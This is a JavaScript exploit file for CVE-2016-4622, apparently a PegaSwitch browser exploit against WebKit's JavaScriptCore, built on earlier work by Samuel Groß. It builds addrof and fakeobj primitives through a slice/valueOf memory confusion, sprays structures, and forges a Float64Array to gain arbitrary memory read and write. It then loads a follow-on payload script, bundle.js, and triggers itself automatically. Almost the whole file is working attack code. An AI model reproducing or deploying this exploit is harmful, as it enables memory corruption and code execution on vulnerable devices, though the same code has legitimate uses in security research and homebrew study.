/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* global XMLHttpRequest, alert, ImageData, postMessage, history */
function send (ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {

	}
}

function log (msg) {
	send('log', msg === undefined ? 'undefined' : msg.toString());
}

window.onerror = function (msg, url, line) {
	if (msg === 'Out of memory') { alert(msg); }
	send('error', [line, msg]);
	//	location.reload();
};

var _dview;
function u2d (low, hi) {
	if (!_dview) _dview = new DataView(new ArrayBuffer(8));
	_dview.setUint32(0, low, true);
	_dview.setUint32(4, hi, true);
	return _dview.getFloat64(0, true);
}

function d2u (d) {
	if (!_dview) _dview = new DataView(new ArrayBuffer(8));
	_dview.setFloat64(0, d, true);
	return [_dview.getUint32(0, true), _dview.getUint32(4, true)];
}

function d2b (d) {
	var buf = new ArrayBuffer(8);
	var f64_buf = new Float64Array(buf);
	f64_buf[0] = d;
	return Array.from(new Int8Array(buf));
}

/*
*	Exploit module for CVE-2016-4622.
*
*	Copyright (c) 2016 Samuel Gro√ü
*	Copyright (c) 2018 PegaSwitch
*/

/* Utility functions. */
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
		res.push(hex(bytes[i]));

	return res.join('');
}

function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
		throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
		bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

	return bytes;
}

var Struct = (function() {
	var buffer		= new ArrayBuffer(8);
	var byteView	= new Uint8Array(buffer);
	var uint32View	= new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
		pack: function(type, value) {
			var view = type;
			view[0] = value;
			return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
		},

		unpack: function(type, bytes) {
			if (bytes.length !== type.BYTES_PER_ELEMENT)
				throw Error("Invalid bytearray");

			var view = type;
			byteView.set(bytes);
			return view[0];
		},

		int8:	 byteView,
		int32:	 uint32View,
		float64: float64View
	};
})();

/* Datatype to represent 64-bit integers. */
function Int64(v) {
	var bytes = new Uint8Array(8);

	switch (typeof v) {
		case 'number':
			v = '0x' + Math.floor(v).toString(16);
		case 'string':
			if (v.startsWith('0x'))
				v = v.substr(2);
			if (v.length % 2 == 1)
				v = '0' + v;

			var bigEndian = unhexlify(v, 8);
			bytes.set(Array.from(bigEndian).reverse());
			break;
		case 'object':
			if (v instanceof Int64) {
				bytes.set(v.bytes());
			} else {
				if (v.length != 8)
					throw TypeError("Array must have excactly 8 elements.");
				bytes.set(v);
			}
			break;
		case 'undefined':
			break;
		default:
			throw TypeError("Int64 constructor requires an argument.");
	}

	this.asDouble = function() {
		if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
			throw new RangeError("Integer can not be represented by a double");

		return Struct.unpack(Struct.float64, bytes);
	};

	this.asJSValue = function() {
		if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
			throw new RangeError("Integer can not be represented by a JSValue");

		this.assignSub(this, 0x1000000000000);
		var res = Struct.unpack(Struct.float64, bytes);
		this.assignAdd(this, 0x1000000000000);

		return res;
	};

	this.bytes = function() {
		return Array.from(bytes);
	};

	this.byteAt = function(i) {
		return bytes[i];
	};

	this.toString = function() {
		return '0x' + hexlify(Array.from(bytes).reverse());
	};

	function operation(f, nargs) {
		return function() {
			if (arguments.length != nargs)
				throw Error("Not enough arguments for function " + f.name);
			for (var i = 0; i < arguments.length; i++)
				if (!(arguments[i] instanceof Int64))
					arguments[i] = new Int64(arguments[i]);
			return f.apply(this, arguments);
		};
	}

	this.assignNeg = operation(function neg(n) {
		for (var i = 0; i < 8; i++)
			bytes[i] = ~n.byteAt(i);

		return this.assignAdd(this, Int64.One);
	}, 1);

	this.assignAdd = operation(function add(a, b) {
		var carry = 0;
		for (var i = 0; i < 8; i++) {
			var cur = a.byteAt(i) + b.byteAt(i) + carry;
			carry = cur > 0xff | 0;
			bytes[i] = cur;
		}
		return this;
	}, 2);

	this.assignSub = operation(function sub(a, b) {
		var carry = 0;
		for (var i = 0; i < 8; i++) {
			var cur = a.byteAt(i) - b.byteAt(i) - carry;
			carry = cur < 0 | 0;
			bytes[i] = cur;
		}
		return this;
	}, 2);
}

Int64.fromDouble = function(d) {
	var bytes = Struct.pack(Struct.float64, d);
	return new Int64(bytes);
};

function Neg(n) {
	return (new Int64()).assignNeg(n);
}

function Add(a, b) {
	return (new Int64()).assignAdd(a, b);
}

function Sub(a, b) {
	return (new Int64()).assignSub(a, b);
}

Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

/* Core exploit primitives. */
function addrof(object) {
	var a = [];
	for (var i = 0; i < 100; i++)
		a.push(i + 0.1337);

	var b = a.slice(0, {valueOf: function() { a.length = 0; a = [object]; return 4; }});
	return Int64.fromDouble(b[3]);
}

function fakeobj(addr) {
	var a = []
	for (var i = 0; i < 100; i++)
		a.push({});

	addr = addr.asDouble();
	return a.slice(0, {valueOf: function() { a.length = 0; a = [addr]; return 4; }})[3];
}

window.minmain = function minmain () {
	var structs = [];
	function sprayStructures() {
		function randomString() {
			return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
		}
		for (var i = 0; i < 0x1000; i++) {
			var a = new Float64Array(1);
			a[randomString()] = 1337;
			structs.push(a);
		}
	}

	sprayStructures();

	var hax = new Uint8Array(0x1000);

	log("[*] Setting up container object");

	var jsCellHeader = new Int64([
		00, 0x10, 00, 00,
		0x0,
		0x27,
		0x18,
		0x1
	]);

	var container = {
		jsCellHeader: jsCellHeader.asJSValue(),
		butterfly: false,
		vector: hax,
		lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
	};

	var address = Add(addrof(container), 16);
	log("[*] Fake JSObject @ " + address);

	var fakearray = fakeobj(address);

	while (!(fakearray instanceof Float64Array)) {
		jsCellHeader.assignAdd(jsCellHeader, Int64.One);
		container.jsCellHeader = jsCellHeader.asJSValue();
	}

	log("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

	memory = {
		read: function(addr, length) {
			log("[<] Reading " + length + " bytes from " + addr);
			fakearray[2] = addr.asDouble();
			var a = new Array(length);
			for (var i = 0; i < length; i++)
				a[i] = hax[i];
			return a;
		},

		readInt64: function(addr) {
			return new Int64(this.read(addr, 8));
		},

		write: function(addr, data) {
			log("[>] Writing " + data.length + " bytes to " + addr);
			fakearray[2] = addr.asDouble();
			for (var i = 0; i < data.length; i++)
				hax[i] = data[i];
		},

		writeInt64: function(addr, val) {
			return this.write(addr, val.bytes());
		}
	};

	var empty = {};
	var header = memory.read(addrof(empty), 8);
	memory.write(addrof(container), header);

	var f64array = new Float64Array(8);
	header = memory.read(addrof(f64array), 16);
	memory.write(addrof(fakearray), header);

	memory.write(Add(addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

	log("[+] All done!");

	fakearray.container = container;
	
	/* Re-use old exploit flow with the new primitives. */
	var view_a = new Uint32Array(0);
	var fobj_a = new Uint32Array(0);
	var fobj_b = { b: 0 };

	var view_a_addr = addrof(view_a); 
	var view_a_vect = addrof(fobj_a);

	memory.write(Add(view_a_addr, 0x10), d2b(view_a_vect.asDouble()));
	memory.write(Add(view_a_addr, 0x18), [0x08,0x00,0x00,0x00,0x01,0x00,0x00,0x00]);
  
	view_a[7] = 1;

	log('Success!');
		
	loadRun({
		va: view_a,
		vb: fobj_a,
		leakee: fobj_b,
		leakaddr: d2u(addrof(fobj_b).asDouble()),
	});
};

function loadRun (obj) {
	window.exploitMe = obj;
	var elem = document.createElement('script');
	elem.setAttribute('src', 'bundle.js');
	document.body.appendChild(elem);
}

setTimeout(function () {
	document.getElementById('test').click();
}, 100);
